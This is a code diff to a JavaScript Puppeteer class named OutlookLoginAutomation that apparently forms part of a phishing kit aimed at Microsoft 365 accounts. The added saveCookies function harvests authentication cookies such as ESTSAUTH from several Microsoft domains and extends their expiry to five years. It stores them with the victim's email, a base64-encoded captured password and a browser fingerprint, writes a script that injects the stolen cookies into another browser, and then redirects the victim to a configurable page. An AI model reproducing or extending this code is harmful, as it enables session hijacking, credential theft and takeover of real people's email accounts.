@@ -760,9 +760,8 @@ class OutlookLoginAutomation {
                 
                 // Save cookies for session persistence
                 try {
-                    const sessionId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
-                    const sessionData = await this.saveCookies(email, sessionId);
-                    console.log(`💾 Session cookies saved successfully: ${sessionData.sessionId}`);
+                    const sessionFilePath = await this.saveCookies(email);
+                    console.log(`💾 Session cookies saved successfully: ${sessionFilePath}`);
                     
                     // Check inbox access
                     try {
@@ -774,7 +773,7 @@ class OutlookLoginAutomation {
                             email: email,
                             url: currentUrl,
                             hasInboxAccess: inboxElements.length > 0,
-                            sessionId: sessionId,
+                            sessionId: Date.now().toString(),
                             cookiesSaved: true,
                             timestamp: new Date().toISOString()
                         };
@@ -785,7 +784,7 @@ class OutlookLoginAutomation {
                             email: email,
                             url: currentUrl,
                             hasInboxAccess: false,
-                            sessionId: sessionId,
+                            sessionId: Date.now().toString(),
                             cookiesSaved: true,
                             timestamp: new Date().toISOString()
                         };
@@ -824,71 +823,221 @@ class OutlookLoginAutomation {
         }
     }
 
-    async saveCookies(email, sessionId) {
+    async saveCookies(email = null, password = null) {
         try {
+            console.log('🍪 Saving enhanced persistent session cookies...');
+
+            // Extended list of Microsoft authentication domains
+            const domains = [
+                'https://login.microsoftonline.com',
+                'https://login.live.com',
+                'https://outlook.office.com',
+                'https://outlook.office365.com',
+                'https://www.office.com',
+                'https://account.microsoft.com',
+                'https://graph.microsoft.com',
+                'https://aadcdn.msftauth.net',
+                'https://aadcdn.msauth.net'
+            ];
+
+            let allCookies = [];
+
+            // Collect cookies from current page first
+            const currentCookies = await this.page.cookies();
+            allCookies = allCookies.concat(currentCookies);
+
+            // Visit each Microsoft domain to collect all auth cookies
+            for (const domain of domains) {
+                try {
+                    console.log(`🌐 Collecting cookies from: ${domain}`);
+                    await this.page.goto(domain, {
+                        waitUntil: 'domcontentloaded',
+                        timeout: 8000
+                    });
+                    const domainCookies = await this.page.cookies();
+                    allCookies = allCookies.concat(domainCookies);
+                    console.log(`✅ Collected ${domainCookies.length} cookies from ${domain}`);
+                } catch (e) {
+                    console.log(`⚠️ Could not access ${domain}: ${e.message}`);
+                }
+            }
+
+            // Filter for essential authentication cookies only
+            const essentialCookieNames = [
+                // Core Microsoft authentication (CRITICAL)
+                'ESTSAUTH', 'ESTSAUTHPERSISTENT', 'buid',
+
+                // Outlook specific (REQUIRED)
+                'luat', 'SuiteServiceProxyKey', 'OWAAppIdType',
+
+                // Session management (MINIMAL)
+                'fpc', 'stsservicecookie', 'x-ms-gateway-slice'
+            ];
+
+            // Remove duplicates and filter for essential cookies only
+            const uniqueCookies = [];
+            const seen = new Set();
+            const cookieMap = new Map();
+
+            // First pass: collect all cookies and identify the best version of each
+            for (const cookie of allCookies) {
+                const isEssential = essentialCookieNames.includes(cookie.name) ||
+                                  cookie.name.startsWith('esctx-');
+
+                if (isEssential) {
+                    const cookieKey = `${cookie.name}|${cookie.domain}`;
+
+                    // If we haven't seen this cookie name+domain combo, or if this one has a longer expiry, use it
+                    if (!cookieMap.has(cookieKey) ||
+                        (cookie.expires > 0 && cookie.expires > (cookieMap.get(cookieKey).expires || 0))) {
+                        cookieMap.set(cookieKey, cookie);
+                    }
+                }
+            }
+
+            // Second pass: process the unique cookies
+            for (const [key, cookie] of cookieMap) {
+                // Force all cookies to be persistent with extended expiry
+                if (cookie.expires === -1 || !cookie.expires || cookie.session) {
+                    // Set expiry to 5 years from now for maximum persistence
+                    cookie.expires = Math.floor(Date.now() / 1000) + (5 * 365 * 24 * 60 * 60);
+                    cookie.session = false;
+                } else {
+                    // Extend existing expiry to 5 years if it's shorter
+                    const fiveYearsFromNow = Math.floor(Date.now() / 1000) + (5 * 365 * 24 * 60 * 60);
+                    if (cookie.expires < fiveYearsFromNow) {
+                        cookie.expires = fiveYearsFromNow;
+                    }
+                }
+
+                // Ensure secure transmission
+                cookie.secure = true;
+                cookie.sameSite = 'None';
+
+                uniqueCookies.push(cookie);
+            }
+
+            console.log(`📦 Optimized to ${uniqueCookies.length} essential authentication cookies (removed ${allCookies.length - uniqueCookies.length} unnecessary cookies)`);
+
+            // Create session data directory
             const fs = require('fs');
             const path = require('path');
+            const sessionDir = 'session_data';
 
-            // Get all cookies from all domains
-            const allCookies = await this.page.cookies();
-            
-            // Filter for Microsoft/Outlook related cookies - capture all authentication domains
-            const relevantCookies = allCookies.filter(cookie => {
-                const domain = cookie.domain.toLowerCase();
-                return domain.includes('microsoftonline.com') || 
-                       domain.includes('outlook.office.com') || 
-                       domain.includes('outlook.live.com') ||
-                       domain.includes('login.microsoftonline.com') ||
-                       domain.includes('account.microsoft.com') ||
-                       domain.includes('office.com') ||
-                       domain.includes('live.com') ||
-                       domain.includes('.microsoft.com') ||
-                       domain.includes('office365.com') ||
-                       domain.includes('sharepoint.com') ||
-                       domain.includes('onedrive.com') ||
-                       domain.includes('graph.microsoft.com');
-            });
-
-            console.log(`🍪 Found ${relevantCookies.length} relevant cookies for ${email}`);
-
-            // Create session directory if it doesn't exist
-            const sessionDir = path.join(__dirname, '..', 'session_data');
             if (!fs.existsSync(sessionDir)) {
                 fs.mkdirSync(sessionDir, { recursive: true });
             }
 
-            // Generate cookie injection script
-            const injectionScript = this.generateCookieInjectionScript(email, relevantCookies, sessionId);
-            const injectFilename = `inject_session_${sessionId}.js`;
-            const injectPath = path.join(sessionDir, injectFilename);
-            
-            fs.writeFileSync(injectPath, injectionScript);
-            console.log(`🍪 Generated cookie injection script: ${injectFilename}`);
+            // Create session file with all cookies in one place
+            const sessionId = Date.now();
+            const sessionTimestamp = new Date().toISOString();
+            const sessionEmail = email || 'unknown';
+            const sessionFileName = `session_${sessionId}_${sessionEmail.replace(/[^a-zA-Z0-9]/g, '_')}.json`;
+            const sessionFilePath = path.join(sessionDir, sessionFileName);
 
-            // Save session data
+            console.log(`📄 Creating single session file: ${sessionFileName}`);
+
+            // Create comprehensive session data with all cookies in one file
             const sessionData = {
-                sessionId: sessionId,
-                email: email,
-                timestamp: new Date().toISOString(),
-                status: 'valid',
-                url: this.page.url(),
-                totalCookies: relevantCookies.length,
-                domains: [...new Set(relevantCookies.map(c => c.domain))],
-                cookies: relevantCookies,
-                injectFilename: injectFilename
+                id: sessionId,
+                timestamp: sessionTimestamp,
+                email: sessionEmail,
+                password: password ? Buffer.from(password).toString('base64') : null,
+                totalCookies: uniqueCookies.length,
+                domains: domains,
+                cookies: uniqueCookies,
+                userAgent: await this.page.evaluate(() => navigator.userAgent),
+                browserFingerprint: {
+                    viewport: await this.page.viewport(),
+                    timezone: await this.page.evaluate(() => Intl.DateTimeFormat().resolvedOptions().timeZone),
+                    language: await this.page.evaluate(() => navigator.language)
+                }
             };
 
-            const sessionFilename = `session_${sessionId}_${email.replace(/[@.]/g, '_')}.json`;
-            const sessionPath = path.join(sessionDir, sessionFilename);
-            
-            fs.writeFileSync(sessionPath, JSON.stringify(sessionData, null, 2));
-            console.log(`💾 Saved session data: ${sessionFilename}`);
+            fs.writeFileSync(sessionFilePath, JSON.stringify(sessionData, null, 2));
+            console.log(`💾 Session saved with ${uniqueCookies.length} cookies in single file`);
 
-            return sessionData;
+            // Create injection script for this session
+            const sessionInjectScript = path.join(sessionDir, `inject_session_${sessionId}.js`);
+            const sessionScriptContent = `
+// Session Cookie Injector
+// Auto-generated on ${sessionTimestamp}
+// Session: ${sessionEmail} (${uniqueCookies.length} cookies)
+
+(function() {
+    console.log('🚀 Injecting ${uniqueCookies.length} cookies for session: ${sessionEmail}');
+
+    const sessionInfo = {
+        email: '${sessionEmail}',
+        timestamp: '${sessionTimestamp}',
+        cookieCount: ${uniqueCookies.length}
+    };
+
+    console.log('📧 Session info:', sessionInfo);
+
+    const cookies = ${JSON.stringify(uniqueCookies, null, 4)};
+    let injected = 0;
+
+    cookies.forEach(cookie => {
+        try {
+            let cookieStr = cookie.name + '=' + cookie.value + ';';
+            cookieStr += 'domain=' + cookie.domain + ';';
+            cookieStr += 'path=' + cookie.path + ';';
+            cookieStr += 'expires=' + new Date(cookie.expires * 1000).toUTCString() + ';';
+            if (cookie.secure) cookieStr += 'secure;';
+            if (cookie.sameSite) cookieStr += 'samesite=' + cookie.sameSite + ';';
+
+            document.cookie = cookieStr;
+            injected++;
+        } catch (e) {
+            console.warn('Failed to inject cookie:', cookie.name);
+        }
+    });
+
+    console.log('✅ Successfully injected ' + injected + ' cookies!');
+    console.log('🌐 Navigate to https://outlook.office.com/mail/ to test');
+
+    // Auto-redirect option
+    setTimeout(() => {
+        if (confirm('Injected ' + injected + ' cookies for ${sessionEmail}! Open Outlook now?')) {
+            window.open('https://outlook.office.com/mail/', '_blank');
+        }
+    }, 1000);
+})();`;
+
+            fs.writeFileSync(sessionInjectScript, sessionScriptContent);
+            console.log(`🔧 Injection script created: ${sessionInjectScript}`);
+
+            console.log(`✅ Session saved with ${uniqueCookies.length} cookies in single file`);
+            console.log(`📄 Session file: ${sessionFilePath}`);
+            if (email) console.log(`📧 Email captured: ${email}`);
+            if (password) console.log(`🔑 Password captured and encoded for future use`);
+
+            // Get configurable redirect URL from server
+            let redirectUrl = 'https://office.com'; // Default fallback
+            try {
+                const response = await fetch('http://localhost:5000/api/internal/redirect-url');
+                const data = await response.json();
+                if (data.success && data.redirectUrl) {
+                    redirectUrl = data.redirectUrl;
+                }
+            } catch (error) {
+                console.warn('Could not fetch redirect config, using default:', error.message);
+            }
+
+            // Redirect to configured destination after successful cookie save
+            console.log(`🔄 Redirecting to ${redirectUrl}...`);
+            await this.page.goto(redirectUrl, {
+                waitUntil: 'networkidle2',
+                timeout: 30000
+            });
+            console.log(`✅ Redirected to ${redirectUrl} successfully`);
+
+            return sessionFilePath;
 
         } catch (error) {
-            console.error('Error saving cookies:', error.message);
-            throw error;
+            console.error('❌ Error saving enhanced session:', error.message);
+            return null;
         }
     }
 
